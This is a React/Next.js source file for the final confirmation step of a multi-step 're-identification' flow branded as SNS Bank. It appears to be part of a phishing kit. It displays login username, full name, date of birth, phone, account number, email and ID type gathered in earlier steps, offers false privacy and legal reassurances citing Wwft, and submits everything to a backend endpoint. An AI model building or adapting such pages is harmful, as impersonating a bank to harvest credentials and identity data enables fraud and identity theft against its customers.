"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { Checkbox } from "@/components/ui/checkbox"
import { CheckCircle, ArrowLeft, Send, Shield, Clock, FileCheck } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

const step4Schema = z.object({
  consent: z.boolean().refine((val) => val === true, "Toestemming is verplicht"),
})

type Step4Data = z.infer<typeof step4Schema>

export default function Step4() {
  const router = useRouter()
  const { toast } = useToast()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [allData, setAllData] = useState<any>(null)

  useEffect(() => {
    const step1Data = localStorage.getItem("step1Data")
    const step2Data = localStorage.getItem("step2Data")
    const step3Data = localStorage.getItem("step3Data")

    if (!step1Data || !step2Data || !step3Data) {
      router.push("/step-1")
      return
    }

    setAllData({
      ...JSON.parse(step1Data),
      ...JSON.parse(step2Data),
      ...JSON.parse(step3Data),
    })
  }, [router])

  const form = useForm<Step4Data>({
    resolver: zodResolver(step4Schema),
    defaultValues: {
      consent: false,
    },
  })

  const onSubmit = async (data: Step4Data) => {
    setIsSubmitting(true)

    try {
      const completeData = { ...allData, ...data }

      const response = await fetch("/api/final-submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(completeData),
      })

      if (!response.ok) {
        throw new Error("Fout bij verzenden")
      }

      // Clear stored data
      localStorage.removeItem("step1Data")
      localStorage.removeItem("step2Data")
      localStorage.removeItem("step3Data")

      toast({
        title: "Re-identificatie voltooid!",
        description: "Uw gegevens zijn succesvol verzonden naar SNS Bank.",
      })

      router.push("/success")
    } catch (error) {
      toast({
        title: "Fout bij verzenden",
        description: "Er is een fout opgetreden. Probeer het opnieuw.",
        variant: "destructive",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleBack = () => {
    router.push("/step-3")
  }

  if (!allData) {
    return <div>Loading...</div>
  }

  const getSummaryData = () => {
    const accountTypesText =
      allData.accountTypes
        ?.map((type: string) => {
          return type === "private" ? "Particulier" : type === "business" ? "Zakelijk" : "Creditcard"
        })
        .join(", ") || ""

    const missingDataText =
      allData.missingData
        ?.map((type: string) => {
          return type === "middlenames"
            ? "Tussenvoegsel/voornamen"
            : type === "address"
              ? "Adresgegevens"
              : type === "birthplace"
                ? "Geboorteplaats"
                : "Nationaliteit"
        })
        .join(", ") || "Geen"

    const idTypeText =
      allData.idType === "passport"
        ? "Paspoort"
        : allData.idType === "id-card"
          ? "Nederlandse identiteitskaart"
          : "Rijbewijs"

    return {
      username: allData.username || "",
      fullName: allData.fullName || "",
      accountTypes: accountTypesText,
      idType: idTypeText,
      dateOfBirth: allData.dateOfBirth || "",
      phoneNumber: allData.phoneNumber || "",
      accountNumber: allData.accountNumber || "",
      fullEmail: allData.fullEmail || "",
      missingData: missingDataText,
    }
  }

  const summaryData = getSummaryData()

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-50 to-white">
      {/* Header with Progress */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-4">
              <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-lg">SNS</span>
              </div>
              <div>
                <h1 className="text-xl font-bold text-gray-900">SNS Bank</h1>
                <p className="text-orange-600 text-sm">Re-identificatie</p>
              </div>
            </div>
          </div>

          {/* Progress Indicator */}
          <div className="flex items-center justify-center">
            <div className="flex items-center space-x-4">
              <div className="flex items-center">
                <div className="w-10 h-10 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  ✓
                </div>
                <span className="ml-3 text-sm font-medium text-green-600">Inloggen</span>
              </div>
              <div className="w-12 h-px bg-green-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  ✓
                </div>
                <span className="ml-3 text-sm font-medium text-green-600">Persoonlijke gegevens</span>
              </div>
              <div className="w-12 h-px bg-green-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  ✓
                </div>
                <span className="ml-3 text-sm font-medium text-green-600">Aanvullende info</span>
              </div>
              <div className="w-12 h-px bg-orange-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-orange-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  4
                </div>
                <span className="ml-3 text-sm font-medium text-orange-600">Bevestiging</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 py-12">
        <Card className="shadow-xl border-0">
          <CardContent className="p-8">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle className="h-10 w-10 text-green-600" />
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">Bevestiging en verzending</h2>
              <p className="text-gray-600">Controleer uw gegevens en geef toestemming voor verwerking</p>
            </div>

            {/* Summary Section */}
            <div className="bg-gray-50 rounded-xl p-6 mb-8 border border-gray-200">
              <h3 className="text-xl font-semibold mb-6 text-gray-900 flex items-center">
                <FileCheck className="h-6 w-6 mr-3 text-orange-600" />
                Overzicht van uw gegevens
              </h3>
              <div className="grid md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <div>
                    <span className="font-semibold text-gray-700">Gebruikersnaam:</span>
                    <p className="text-gray-900">{summaryData.username}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">Volledige naam:</span>
                    <p className="text-gray-900">{summaryData.fullName}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">Rekeningtypes:</span>
                    <p className="text-gray-900">{summaryData.accountTypes}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">ID type:</span>
                    <p className="text-gray-900">{summaryData.idType}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">Geboortedatum:</span>
                    <p className="text-gray-900">{summaryData.dateOfBirth}</p>
                  </div>
                </div>
                <div className="space-y-4">
                  <div>
                    <span className="font-semibold text-gray-700">Telefoonnummer:</span>
                    <p className="text-gray-900">{summaryData.phoneNumber}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">Rekeningnummer:</span>
                    <p className="text-gray-900">{summaryData.accountNumber}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">E-mailadres:</span>
                    <p className="text-gray-900">{summaryData.fullEmail}</p>
                  </div>
                  <div>
                    <span className="font-semibold text-gray-700">Ontbrekende gegevens:</span>
                    <p className="text-gray-900">{summaryData.missingData}</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Important Information */}
            <div className="grid md:grid-cols-3 gap-6 mb-8">
              <div className="bg-blue-50 border border-blue-200 rounded-xl p-6">
                <div className="flex items-center space-x-3 mb-3">
                  <Shield className="h-6 w-6 text-blue-600" />
                  <h4 className="font-semibold text-blue-900">Privacy</h4>
                </div>
                <p className="text-blue-800 text-sm">
                  Uw gegevens worden veilig opgeslagen volgens de geldende privacywetgeving
                </p>
              </div>
              <div className="bg-green-50 border border-green-200 rounded-xl p-6">
                <div className="flex items-center space-x-3 mb-3">
                  <FileCheck className="h-6 w-6 text-green-600" />
                  <h4 className="font-semibold text-green-900">Gebruik</h4>
                </div>
                <p className="text-green-800 text-sm">
                  We gebruiken uw gegevens alleen voor identificatie en niet voor marketing
                </p>
              </div>
              <div className="bg-orange-50 border border-orange-200 rounded-xl p-6">
                <div className="flex items-center space-x-3 mb-3">
                  <Clock className="h-6 w-6 text-orange-600" />
                  <h4 className="font-semibold text-orange-900">Wettelijk</h4>
                </div>
                <p className="text-orange-800 text-sm">Dit proces is vereist volgens de Wwft wetgeving</p>
              </div>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                <FormField
                  control={form.control}
                  name="consent"
                  render={({ field }) => (
                    <FormItem className="bg-yellow-50 border border-yellow-200 rounded-xl p-6">
                      <div className="flex items-start space-x-4">
                        <FormControl>
                          <Checkbox checked={field.value} onCheckedChange={field.onChange} className="mt-1" />
                        </FormControl>
                        <div className="flex-1">
                          <FormLabel className="text-base font-medium text-gray-900 cursor-pointer">
                            Ik geef toestemming voor het verwerken van mijn gegevens voor re-identificatie volgens de
                            Wwft wetgeving en ga akkoord met de privacyvoorwaarden van SNS Bank.
                          </FormLabel>
                          <p className="text-sm text-gray-600 mt-2">
                            Door dit vakje aan te vinken bevestigt u dat alle ingevoerde gegevens correct zijn en geeft
                            u toestemming voor verwerking.
                          </p>
                          <FormMessage />
                        </div>
                      </div>
                    </FormItem>
                  )}
                />

                <div className="flex flex-col gap-4 mt-10">
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white h-16 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-200"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center space-x-2">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Bezig met verzenden...</span>
                      </div>
                    ) : (
                      <div className="flex items-center space-x-2">
                        <Send className="h-6 w-6" />
                        <span>Verzenden naar SNS Bank</span>
                      </div>
                    )}
                  </Button>
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleBack}
                    disabled={isSubmitting}
                    className="w-full h-14 border-2 border-gray-300 hover:border-orange-500 text-gray-700 hover:text-orange-600 rounded-lg bg-transparent"
                  >
                    <ArrowLeft className="h-5 w-5 mr-2" />
                    Terug naar stap 3
                  </Button>
                </div>
              </form>
            </Form>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
